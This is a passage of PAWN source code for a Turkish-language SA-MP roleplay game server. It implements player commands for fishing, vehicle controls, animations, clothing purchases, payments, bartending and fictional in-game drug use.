	format(string, sizeof(string), "** (2) Balýk: %s.   Aðýrlýk: %d.", Fishes[playerid][pFish2], Fishes[playerid][pWeight2]);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** (3) Balýk: %s.   Aðýrlýk: %d.", Fishes[playerid][pFish3], Fishes[playerid][pWeight3]);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** (4) Balýk: %s.   Aðýrlýk: %d.", Fishes[playerid][pFish4], Fishes[playerid][pWeight4]);
	SendClientMessage(playerid, COLOR_GREY, string);
	format(string, sizeof(string), "** (5) Balýk: %s.   Aðýrlýk: %d.", Fishes[playerid][pFish5], Fishes[playerid][pWeight5]);
	SendClientMessage(playerid, COLOR_GREY, string);
	SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
	return 1;
}

CMD:balikbirak(playerid, params[])
{
	new fishid;
	if(sscanf(params, "d", fishid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /balikbirak [balýk 1-5]");

	if(fishid < 1 || fishid > 5) { SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /balikbirak [balýk 1-5]"); return 1; }
	else if(fishid == 1 && Fishes[playerid][pWeight1] < 1) { SendClientMessage(playerid, COLOR_GREY, "Bu slot boþ."); return 1; }
	else if(fishid == 2 && Fishes[playerid][pWeight2] < 1) { SendClientMessage(playerid, COLOR_GREY, "Bu slot boþ."); return 1; }
	else if(fishid == 3 && Fishes[playerid][pWeight3] < 1) { SendClientMessage(playerid, COLOR_GREY, "Bu slot boþ."); return 1; }
	else if(fishid == 4 && Fishes[playerid][pWeight4] < 1) { SendClientMessage(playerid, COLOR_GREY, "Bu slot boþ."); return 1; }
	else if(fishid == 5 && Fishes[playerid][pWeight5] < 1) { SendClientMessage(playerid, COLOR_GREY, "Bu slot boþ."); return 1; }
	ClearFishID(playerid, fishid);
	Fishes[playerid][pLastFish] = 0;
	Fishes[playerid][pFishID] = 0;
	SendClientMessage(playerid, COLOR_GREY, "Bir balýðý serbest býraktýn.");
	return 1;
}

CMD:baligigeriat(playerid, params[])
{
	if(Fishes[playerid][pLastFish] > 0)
	{
		ClearFishID(playerid, Fishes[playerid][pLastFish]);
		Fishes[playerid][pLastFish] = 0;
		Fishes[playerid][pFishID] = 0;
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Son tuttuðun balýðý denize geri attýn.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Henüz bir balýk yakalamadýn.");
		return 1;
	}
	return 1;
}

CMD:baliklarigeriat(playerid, params[])
{
	if(Fishes[playerid][pWeight1] > 0 || Fishes[playerid][pWeight2] > 0 || Fishes[playerid][pWeight3] > 0 || Fishes[playerid][pWeight4] > 0 || Fishes[playerid][pWeight5] > 0)
	{
		ClearFishes(playerid);
		Fishes[playerid][pLastFish] = 0;
		Fishes[playerid][pFishID] = 0;
		SendClientMessage(playerid, COLOR_GREY, "Tüm balýklarýný geri attýn.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Henüz bir balýk yakalamadýn.");
		return 1;
	}
	return 1;
}

CMD:tumbaliklarisat(playerid, params[])
{
	new
	    iPrice,
	    szMessage[128];

    new idx = GetPlayerVirtualWorld(playerid)-100;
    if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 1 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GREY, "Herhangi bir iþ yerinin içinde deðilsin.");

	if(Fishes[playerid][pWeight1] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid1]);
		iPrice = (iPrice * Fishes[playerid][pWeight1]) / 10;
		GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
		format(szMessage, sizeof(szMessage), "* %s adlý balýðýný sattýn. (Balýk #1) Aðýrlýk: %d kilogram, Fiyatý: %d $.", Fishes[playerid][pFish1],Fishes[playerid][pWeight1],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 1);
	}

	if(Fishes[playerid][pWeight2] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid2]);
		iPrice = (iPrice * Fishes[playerid][pWeight2]) / 10;
		GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
		format(szMessage, sizeof(szMessage), "* %s adlý balýðýný sattýn. (Balýk #2) Aðýrlýk: %d kilogram, Fiyatý: %d $.", Fishes[playerid][pFish2],Fishes[playerid][pWeight2],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 2);
	}

	if(Fishes[playerid][pWeight3] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid3]);
		iPrice = (iPrice * Fishes[playerid][pWeight3]) / 10;
		GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
		format(szMessage, sizeof(szMessage), "* %s adlý balýðýný sattýn. (Balýk #3) Aðýrlýk: %d kilogram, Fiyatý: %d $.", Fishes[playerid][pFish3],Fishes[playerid][pWeight3],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 3);
	}

	if(Fishes[playerid][pWeight4] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid4]);
		iPrice = (iPrice * Fishes[playerid][pWeight4]) / 10;
		GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
		format(szMessage, sizeof(szMessage), "* %s adlý balýðýný sattýn. (Balýk #4) Aðýrlýk: %d kilogram, Fiyatý: %d $.", Fishes[playerid][pFish4],Fishes[playerid][pWeight4],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 4);
	}

	if(Fishes[playerid][pWeight5] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid5]);
		iPrice = (iPrice * Fishes[playerid][pWeight5]) / 10;
		GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
		format(szMessage, sizeof(szMessage), "* %s adlý balýðýný sattýn. (Balýk #5) Aðýrlýk: %d kilogram, Fiyatý: %d $.", Fishes[playerid][pFish5],Fishes[playerid][pWeight5],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 5);
	}
	return 1;
}

CMD:baliksat(playerid, params[])
{
	if(!IsAt247(playerid))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   Markette deðilsin.");
		return 1;
	}

	new string[128], fishid;
	if(sscanf(params, "d", fishid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /baliksat [balýk]");

	new price;
	if(fishid < 1 || fishid > 5) { SendClientMessage(playerid, COLOR_GREY, "   1-5 arasýnda bir slot seçin!"); return 1; }
	else if(fishid == 1 && Fishes[playerid][pWeight1] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Bu slotunda balýk yok(1)!"); return 1; }
	else if(fishid == 2 && Fishes[playerid][pWeight2] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Bu slotunda balýk yok(2)!"); return 1; }
	else if(fishid == 3 && Fishes[playerid][pWeight3] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Bu slotunda balýk yok(3)!"); return 1; }
	else if(fishid == 4 && Fishes[playerid][pWeight4] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Bu slotunda balýk yok(4)!"); return 1; }
	else if(fishid == 5 && Fishes[playerid][pWeight5] < 1) { SendClientMessage(playerid, COLOR_GREY, "   Bu slotunda balýk yok(5)!"); return 1; }

	switch (fishid)
	{
	case 1:
		{
			if(Fishes[playerid][pWeight1] < 10)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Market sadece 10 kilogram üstü balýklarý satýn alýr");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid1]);
			price = (price * Fishes[playerid][pWeight1]) / 10;
			GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
			format(string, sizeof(string), "* %s adlý balýðý sattýn. Aðýrlýk: %d kilogram, Fiyat: %d$.", Fishes[playerid][pFish1],Fishes[playerid][pWeight1],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 1);
		}
	case 2:
		{
			if(Fishes[playerid][pWeight2] < 10)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Market sadece 1 kilogram üstü balýklarý satýn alýr");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid2]);
			price = (price * Fishes[playerid][pWeight2]) / 10;
			GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
			format(string, sizeof(string), "* %s adlý balýðý sattýn. Aðýrlýk: %d kilogram, Fiyat: %d$.", Fishes[playerid][pFish2],Fishes[playerid][pWeight2],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 2);
		}
	case 3:
		{
			if(Fishes[playerid][pWeight3] < 10)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Market sadece 10 kilogram üstü balýklarý satýn alýr");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid3]);
			price = (price * Fishes[playerid][pWeight3]) / 10;
			GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
			format(string, sizeof(string), "* %s adlý balýðý sattýn. Aðýrlýk: %d kilogram, Fiyat: %d$.", Fishes[playerid][pFish3],Fishes[playerid][pWeight3],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 3);
		}
	case 4:
		{
			if(Fishes[playerid][pWeight4] < 10)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Market sadece 10 kilogram üstü balýklarý satýn alýr");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid4]);
			price = (price * Fishes[playerid][pWeight4]) / 10;
			GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
			format(string, sizeof(string), "* %s adlý balýðý sattýn. Aðýrlýk: %d kilogram, Fiyat: %d$.", Fishes[playerid][pFish4],Fishes[playerid][pWeight4],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 4);
		}
	case 5:
		{
			if(Fishes[playerid][pWeight5] < 10)
			{
				SendClientMessage(playerid, COLOR_WHITE, "Market sadece 20 kilogram üstü balýklarý satýn alýr");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid5]);
			price = (price * Fishes[playerid][pWeight5]) / 10;
			GameTextForPlayer(playerid, "~g~Balik~n~~r~Satildi", 3000, 1);
			format(string, sizeof(string), "* %s adlý balýðý sattýn. Aðýrlýk: %d kilogram, Fiyat: %d$.", Fishes[playerid][pFish5],Fishes[playerid][pWeight5],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 5);
		}
	}
	Fishes[playerid][pLastFish] = 0;
	Fishes[playerid][pFishID] = 0;
	return 1;
}

CMD:arac(playerid, params[])
{
	if(isnull(params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /arac [Ýsim]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Isiklar, Bagaj, Kaput, Cam, Benzin");
		return 1;
	}
	else if(strcmp(params, "isiklar", true) == 0 && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510) return SendClientMessage(playerid,COLOR_WHITE,"Bu komut bu araç içersinde kullanýlamaz");
		SetVehicleLights(vehicleid, playerid);
	}
	else if(strcmp(params, "bagaj", true) == 0)
  	{
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510)
			{
				return SendClientMessage(playerid,COLOR_WHITE,"Bu komut bu araç içersinde kullanýlamaz.");
			}
			SetVehicleTrunk(vehicleid, playerid);
		}
		else if(!IsPlayerInAnyVehicle(playerid))
		{
			new closestcar = GetClosestCar(playerid);
			if(IsPlayerInRangeOfVehicle(playerid, closestcar, 5.0))
			{
				if(GetVehicleModel(closestcar) == 481 || GetVehicleModel(closestcar) == 509 || GetVehicleModel(closestcar) == 510)
				{
					return SendClientMessage(playerid,COLOR_WHITE,"Bu komut bu araç içersinde kullanýlamaz.");
				}
				SetVehicleTrunk(closestcar, playerid);
			}
		}
	}
	else if(strcmp(params, "kaput", true) == 0 && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510 || IsAPlane(vehicleid) || IsABike(vehicleid))
			{
				return SendClientMessage(playerid,COLOR_WHITE,"Bu komut bu araç içersinde kullanýlamaz.");
			}
			SetVehicleHood(vehicleid, playerid);
		}
		else if(!IsPlayerInAnyVehicle(playerid))
		{
			new closestcar = GetClosestCar(playerid);
			if(IsPlayerInRangeOfVehicle(playerid, closestcar, 5.0))
			{
				if(GetVehicleModel(closestcar) == 481 || GetVehicleModel(closestcar) == 509 || GetVehicleModel(closestcar) == 510 || IsAPlane(closestcar) || IsABike(closestcar))
				{
					return SendClientMessage(playerid,COLOR_WHITE,"Bu komut bu araç içersinde kullanýlamaz.");
				}
				SetVehicleHood(closestcar, playerid);
			}
		}
	}
	else if(strcmp(params, "cam", true) == 0 && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			if(IsABoat(GetPlayerVehicleID(playerid)) || IsAPlane(GetPlayerVehicleID(playerid)) || IsABike(GetPlayerVehicleID(playerid)) || IsAHelicopter(GetPlayerVehicleID(playerid)))
				return SendClientMessage(playerid, COLOR_GREY, "Bu araçta cam açamazsýn.");

			new vehicleid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510 || IsAPlane(vehicleid) || IsABike(vehicleid))
				return SendClientMessage(playerid,COLOR_WHITE,"Bu komut bu araç içersinde kullanýlamaz");

			new
				string[128];
			if(IsVehicleWindowsDown[vehicleid] == 0) { // Window Open
				IsVehicleWindowsDown[vehicleid] = 1;
				format(string, sizeof(string), "* %s aracýn penceresini kapatýr.", GetPlayerNameEx(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			} else {
				IsVehicleWindowsDown[vehicleid] = 0;
				format(string, sizeof(string), "* %s aracýn pençeresini açar.", GetPlayerNameEx(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
		}
		else SendClientMessage(playerid,COLOR_WHITE,"Bir araç içersinde deðilsin veya sürücü deðilsin.");
	}
	else if(strcmp(params, "benzin", true) == 0 && IsPlayerInAnyVehicle(playerid))
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 481 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 509 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 510) return 1;
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			if(GetPVarInt(playerid, "fuelonoff") == 0)
			{
				SendClientMessageEx(playerid, COLOR_WHITE, "Benzin göstergesini açtýn.");
				SetPVarInt(playerid, "fuelonoff", 1);
				FuelBar[playerid] = CreateProgressBar( 374, 404, 113.0, 6.2, 866792447, 100.0);
				SetProgressBarValue(FuelBar[playerid], Fuel[GetPlayerVehicleID(playerid)]);
				ShowProgressBarForPlayer(playerid, FuelBar[playerid]);
			}
			else
			{
				SendClientMessageEx(playerid, COLOR_WHITE, "Benzin göstergesini kapattýn.");
				HideProgressBarForPlayer(playerid, FuelBar[playerid]);
				SetPVarInt(playerid, "fuelonoff", 0);
				DestroyProgressBar(FuelBar[playerid]);
				FuelBar[playerid] = INVALID_BAR_ID;
			}
		}
		else SendClientMessage(playerid,COLOR_WHITE,"Bir araç içersinde deðilsin veya sürücü deðilsin!");
	}
	return 1;
}

CMD:animdurdur(playerid, params[])
{
	if(StopaniFloats[playerid][0] != 0)
	{
	    SendClientMessage (playerid, COLOR_GREY, "Zaten animasyonlarýný durdurmayý deniyorsun!");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "Bunu þu an yapamazsýn.");
	}
	else
	{
	    GetPlayerPos(playerid, StopaniFloats[playerid][0], StopaniFloats[playerid][1], StopaniFloats[playerid][2]);
		SetTimerEx("StopaniTimer", 5000, 0, "d", playerid);
		SendClientMessage (playerid, COLOR_YELLOW, "5 saniye kýpýrdama, Animasyonlarýn silinecek!");
	}
	return 1;
}

forward StopaniTimer(playerid);
public StopaniTimer(playerid)
{
	new Float:posX, Float:posY, Float:posZ;
    GetPlayerPos(playerid, posX, posY, posZ);

    if(StopaniFloats[playerid][0] != posX || StopaniFloats[playerid][1] != posY || StopaniFloats[playerid][2] != posZ)
	{
	    SendClientMessage (playerid, COLOR_YELLOW, "Animasyon sýfýrlamasý baþarýsýz oldu, Kýpýrdadýn!");
    	for(new i = 0; i < 3; i++)
		{
			StopaniFloats[playerid][i] = 0;
		}
	    return 1;
	}
	SendClientMessage (playerid, COLOR_YELLOW, "Animasyonlarýn baþarýyla temizlendi!");
	ClearAnimations(playerid, 1);
	SetPlayerSkin(playerid, GetPlayerSkin(playerid));
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);

	for(new i = 0; i < 3; i++)
	{
		StopaniFloats[playerid][i] = 0;
	}
	return 1;
}

CMD:kiyafetal(playerid, params[])
{
    new idx = GetPlayerVirtualWorld(playerid)-100, string[128];
    if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 2 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GREY, "Giyim maðazasýnda deðilsin!");
    if(PlayerInfo[playerid][pCash] < 100) return SendClientMessage(playerid, COLOR_GREY, "Yeterli miktarda paranýz bulunmamaktadýr.");
    ShowModelSelectionMenu(playerid, SkinList, "Skin Menu");
    BizInfo[idx][bMoney] += 100;
	BizInfo[idx][bProducts] --;
	format(string, sizeof(string), "* %s giysilere göz atar.", RPN(playerid));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    return 1;
}

CMD:ode(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	new
		iTargetID, iCashAmount;

	if(sscanf(params, "ui", iTargetID, iCashAmount)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ode [Oyuncu ID/Ýsim] [amount]");

	if(iTargetID == playerid)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Kendi kendine para veremezsin!");
		return 1;
	}
	if(iCashAmount > 100 && PlayerInfo[playerid][pLevel] < 2)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "100$'dan fazla para verebilmek için en az 2 level olmalýsýn.");
		return 1;
	}
	if(iCashAmount < 1 || iCashAmount > 10000)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "10.000 $'dan fazla parayý bir seferde veremezsin.");
		return 1;
	}
	if(IsPlayerConnected(iTargetID))
	{
		if(ProxDetectorS(5.0, playerid, iTargetID))
		{
			new
				szMessage[128], giveplayer[MAX_PLAYER_NAME], sendername[MAX_PLAYER_NAME], playermoney = GetPlayerCash(playerid);

			giveplayer = GetPlayerNameEx(iTargetID);
			sendername = GetPlayerNameEx(playerid);
			if(iCashAmount > 0 && playermoney >= iCashAmount)
			{
				GivePlayerCash(playerid, (0 - iCashAmount));
				GivePlayerCash(iTargetID, iCashAmount);
				format(szMessage, sizeof(szMessage), "    %s(ID: %d) adlý kiþiye %d$ gönderdin.", GetPlayerNameEx(iTargetID),iTargetID, iCashAmount);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, COLOR_GRAD1, szMessage);
				format(szMessage, sizeof(szMessage), "   %s(ID: %d) adlý kiþiden %d$ para aldýn.", GetPlayerNameEx(playerid), playerid, iCashAmount);
				SendClientMessage(iTargetID, COLOR_GRAD1, szMessage);

				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(iTargetID, ipex, sizeof(ipex));
				format(szMessage, sizeof(szMessage), "%s (IP:%s) has paid $%d to %s (IP:%s)", GetPlayerNameEx(playerid), ip, iCashAmount, GetPlayerNameEx(iTargetID), ipex);
				Log("logs/pay.log", szMessage);

				PayWarn[playerid][iTargetID] += iCashAmount;
				if(PayWarn[playerid][iTargetID] >= 10000 && PlayerInfo[playerid][pLevel] <= 3)
				{
					format(szMessage, sizeof(szMessage), "%s (IP:%s) has paid %s (IP:%s) $%d in this session.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(iTargetID), ipex, PayWarn[playerid][iTargetID]);
					ABroadCast(COLOR_YELLOW, szMessage, 1);
				}

				if(iCashAmount >= 100000)
				{
					ABroadCast(COLOR_YELLOW,szMessage,1);
				}

				PlayerPlaySound(iTargetID, 1052, 0.0, 0.0, 0.0);
				format(szMessage, sizeof(szMessage), "* %s adlý kiþi bir miktar para çýkarýr ve %s adlý kiþiye verir.", GetPlayerNameEx(playerid) ,GetPlayerNameEx(iTargetID));
				ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Geçersiz tutar !");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu !");
	return 1;
}

CMD:egitim(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 3.0, 756.229125, 5.614504, 1000.698608) || IsPlayerInRangeOfPoint(playerid, 3.0, 758.43,-78.0,1000.65))
	{
		ShowPlayerDialogEx(playerid, FIGHTMENU, DIALOG_STYLE_LIST, "Dövüþ Stilleri", "Boxing		$5000\nElbow		$5000\nKneehead	$5000\nKung-Fu	$5000\nGrabKick	$5000\nNormal", "Learn", "Iptal");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Dövüþ stili öðrenebileceðin bir yerde deðilsin !(GYM'in içersinde)");
	}
	return 1;
}

CMD:iceceksat(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 19 || PlayerInfo[playerid][pJob2] == 19)
	{
		if(IsAtBar(playerid))
		{
			new string[128], giveplayerid;
			if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /iceceksat [Oyuncu ID/Ýsmi]");

			if(IsPlayerConnected(giveplayerid))
			{
				if(playerid == giveplayerid)
				{
					return SendClientMessage(playerid, COLOR_GREY, " Kendine içecek satamazsýn.");
				}
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					DrinkOffer[giveplayerid] = playerid;
					format(string, sizeof(string), "* Barmen %s size bir içecek satmak istiyor. Kendinize bir içecek seçmek için /kabulet icecek.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s adlý kiþiye bir içecek satmaya çalýþýyorsun.",GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				}
				else
				{
					return SendClientMessage(playerid, COLOR_GREY, " Bu kiþi yanýnda deðil!");
				}
			}
			else
			{
				return SendClientMessage(playerid, COLOR_GREY, " Bu kiþi oyunda deðil!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Herhangi bir Barýn içersinde deðilsin!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Barmen Deðilsin!");
		return 1;
	}
	return 1;
}

CMD:potkullan(playerid, params[]) {
	if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "Etkinlikteyken pot kullanamazsýn!");

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Paintball oynarken pot kullanamazsýn.");

	if(PlayerBoxing[playerid] > 0)
		return SendClientMessage(playerid, COLOR_GREY, "Box müsabakasýnda pot kullanamazsýn.");

	if(PlayerCuffed[playerid] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Kelepçeliyken/þokluyken pot kullanamazsýn.");

	if(UsedWeed[playerid] == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "Daha fazla uyuþturucu kullanmak için 5 saniye beklemelisin.");

	if(GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "Yaralýyken uyuþturucu kullanamazsýn.");

	new string[128], Float:health, healthint;
	GetPlayerHealth(playerid, health);
	healthint = floatround(health, floatround_round);
	if(healthint >= 100)
	{
		SendClientMessage(playerid, COLOR_GREY, "Canýn zaten maksimum seviyede.");
		return 1;
	}
	if(PlayerInfo[playerid][pPot] > 1)
	{
		if(PlayerStoned[playerid] > 3) return SendClientMessage(playerid, COLOR_GRAD1, "Pot kullandýðýn içink kafan iyi oldu.");
		PlayerStoned[playerid] += 1;
		if(PlayerStoned[playerid] == 3)
		{
			GameTextForPlayer(playerid, "~w~Sahroþ ~b~Oldun !", 5000, 3);
		}
		if(healthint > 80)
		{
			SetPlayerHealth(playerid, 100);
		}
		else
		{
			SetPlayerHealth(playerid, health + 20.0);
		}
		SendClientMessage(playerid, COLOR_GREY, " 2 gram pot kullandýnýz!");
		format(string, sizeof(string), "* %s adlý kiþi biraz pot kullandý.", GetPlayerNameEx(playerid));
		ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		PlayerInfo[playerid][pPot] -= 2;
		UsedWeed[playerid] = 1;
		SetTimerEx("ClearDrugs", 5000, false, "d", playerid);
		if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid,"SMOKING","M_smkstnd_loop",2.1,0,0,0,0,0);
		switch(GetPVarInt(playerid, "STD")) {
			case 1:
			{
				DeletePVar(playerid, "STD");
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu kullandýðýn için AIDS hastalýðýndan kurtuldun!");
			}
			case 2:
			{
				SetPVarInt(playerid, "STD", 1);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Hastalýðýndan kurtulmak için aþama kaydettin!");
			}
			case 3:
			{
				SetPVarInt(playerid, "STD", 2);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You reduced the STD to gonorrhea because of the drugs!");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY,"Üzerinde pot yok!");
	}
	return 1;
}

CMD:crackkullan(playerid, params[])
{
	if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "Etkinlikteyken iyileþtiremezsin!");

	new Float:armour;
	GetPlayerArmour(playerid, armour);

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Paintball oynarken Crack kullanamazsýn.");

	if(PlayerBoxing[playerid] > 0)
		return SendClientMessage(playerid, COLOR_GREY, "Box müsabakasýnda Crack kullanamzsýn.");

	if(PlayerCuffed[playerid] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Kelepçeliyken/þokluyken crack kullanamazsýn.");

	if(UsedWeed[playerid] == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "Daha fazla crack kullanmak için 5 saniye beklemelisin.");

	if(armour >= 100)
		return SendClientMessage(playerid, COLOR_GREY, "Zýrhýn zaten maksimum seviyede.");

	if(GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "Yaralýyken Crack kullanamazsýn.");

	if(PlayerInfo[playerid][pCrack] > 1)
	{
		if(PlayerStoned[playerid] > 3) return SendClientMessage(playerid, COLOR_GRAD1, "Crack kullandýðýn için kafan iyi oldu.");
		PlayerStoned[playerid] += 1;
		if(PlayerStoned[playerid] == 3)
		{
			GameTextForPlayer(playerid, "~w~Sarhoþ ~b~Oldun", 5000, 3);
		}
		new string[128], Float:PlayersArmour;
